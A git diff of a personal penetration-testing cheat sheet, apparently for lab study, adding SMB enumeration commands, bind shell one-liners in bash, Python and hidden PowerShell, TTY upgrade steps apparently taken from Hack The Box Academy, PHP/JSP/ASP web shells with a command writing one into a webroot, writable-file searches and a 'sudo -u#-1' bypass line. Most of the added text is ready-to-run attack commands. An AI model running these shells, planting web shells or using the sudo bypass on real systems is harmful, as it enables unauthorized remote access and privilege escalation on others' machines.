@@ -70,6 +70,13 @@ To use a custom NMAP script (.nes script) we must download it first from Github 
 nmap -sV --script "cve-script-name" <target>
 ```
 
+
+### ###NMAP Scripting SMB:
+```bash
+nmap --script smb-os-discovery.nse -p445 <target>
+```
+
+
 ### LOLBin approach for NMAP on Windows
 ```powershell
 Test-NetConnection -Port <PORT> <HOST>
@@ -85,7 +92,15 @@ It has been attacked over the years and this led to an implementation to a bette
 ```bash
 sudo nbtscan -r <target-range>
 ```
-To scan for SMB shares it can be used the tool `enum4linux` and then the connection can be tested with
+
+Scan with:
+```bash
+smbclient -N -L \\\\<target>
+```
+
+
+Or To scan for SMB shares it can be used the tool `enum4linux` and then the connection can be tested with
+
 ```bash
 smbclient -L //<IP>
 ```
@@ -1788,7 +1803,7 @@ Will set the SUID over the bash binary. That means that using
 
 A **root** shell will be gained. The "-p" option preserve the SUID bit. In this way the bash program is called with the owner privileges (root) and if It is not called with "-p" It remains a normal bash shell. Many programs like linpeas.sh or some privesc checker will anyway find this backdoor and report it.
 
-# Reverse Shell VS Bind Shell
+### Reverse Shell VS Bind Shell
 What use and when? Typically we use the bind shell in two scenarios. The first is the one in which we already have the access to the machine and we want a persistent access or a backdoor on it. In order to do that we could set a service that binds that port at every boot of the machine. The second scenario is the one in which we are not in the same internal network of the machine and we can't reach our machine from the victim because, for example, we are reaching the victim through web access and to obtain a reverse shell we likely have to enable port forwarding on the router of our networking. In this scenario a bind shell could let the attacker conenct to the victim knowing only the external IP of the victim.
 
 ## Reverse Shell
@@ -1800,7 +1815,7 @@ Once the reverse shell payload is executed on the victim machine, on the attacke
 nc -lvnp 4444 -e /bin/bash
 ```
 
-## Bind Shell
+#### Bind Shell
 Receiving a command line access to a remote machine, where the victim enstablish the connection to the victim machine that is the listener.
 
 Once the foothold is gained on the victim machine, It can be set up a listener that opens a shell at every connection. After the following conenction is made, we can obtain a shell access on the victim machine. This command is run from the attacker.
@@ -1809,11 +1824,173 @@ Once the foothold is gained on the victim machine, It can be set up a listener t
 nc <REMOTE-IP> 4444
 ```
 
+###### bash:
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```
+###### Python:
+```python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+###### Powershell
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+
+---
+
+#### Netcat Connection
+
+Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.
+
+We can use `netcat` to connect to that port and get a connection to the shell:
+
+Types of Shells
+
+```shell-session
+George231@htb[/htb]$ nc 10.10.10.1 1234
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
+
+---
+
+#### Upgrading TTY
+
+Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
+
+There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
+
+Types of Shells
+
+```shell-session
+George231@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
+
+Types of Shells
+
+```shell-session
+www-data@remotehost$ ^Z
+
+George231@htb[/htb]$ stty raw -echo
+George231@htb[/htb]$ fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
+```
+
+Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
+
+We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
+
+Types of Shells
+
+```shell-session
+George231@htb[/htb]$ echo $TERM
+
+xterm-256color
+```
+
+Types of Shells
+
+```shell-session
+George231@htb[/htb]$ stty size
+
+67 318
+```
+
+The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
+
+Types of Shells
+
+```shell-session
+www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 67 columns 318
+```
+
+Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
+
+---
+
+## Web Shell
+
+The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.
+
+#### Writing a Web Shell
+
+First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:
+
+Code: php
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+Code: jsp
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+Code: asp
+
+```asp
+<% eval request("cmd") %>
+```
+
+---
+
+#### Uploading a Web Shell
+
+Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.
+
+However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
+
+|Web Server|Default Webroot|
+|---|---|
+|`Apache`|/var/www/html/|
+|`Nginx`|/usr/local/nginx/html/|
+|`IIS`|c:\inetpub\wwwroot\|
+|`XAMPP`|C:\xampp\htdocs\|
+
+We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:
+
+Code: bash
+
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+---
+
+#### Accessing Web Shell
+
+Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
+
+![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)
+
+Another option is to use `cURL`:
+
+Types of Shells
+
+```shell-session
+George231@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
 
 # Shell Stabilization
 Once we gain a shell, many times we don't have a fully interactive environment. We can use many tools to stabilize it.
 
-## Netcat
+#### Netcat
 From the kali machine we run the listener
 
 ```bash
@@ -1832,7 +2009,7 @@ If we have a linux machine
 .\nc.exe <IP> <PORT> -e bash
 ```
 
-## Python3
+#### Python3
 Checking if the terminal is tty, otherwhise spawn a tty with python3
 
 ```bash
@@ -1840,7 +2017,7 @@ tty
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-## Powercat
+#### Powercat
 We can use Powercat to serve the shell on the listener
 
 ```bash
@@ -1951,6 +2128,22 @@ List all executed cronjobs
 grep "CRON" /var/log/syslog
  ```
 
+Cron jobs:
+```bash
+ls -la /etc/cron.daily/
+ ```
+
+Find writable directories:
+```bash
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+ ```
+
+Find writable files:
+```bash
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+ ```
+
+
 Generating a new user in /etc/passwd
 
  ```bash
@@ -1994,7 +2187,19 @@ Download all the resources on a FTP server
 ```bash
 wget -r --user="USERNAME" --password="PASSWORD" ftp://<IP>
 ```
+access to history:
 
+```bash
+```shell-session
+history
+```
+
+Sudo only root:
+![[Pasted image 20250113074118.png]]
+
+```bash
+sudo -u#-1`
+```
 # Useful Windows Commands
 Find a file in the system
 
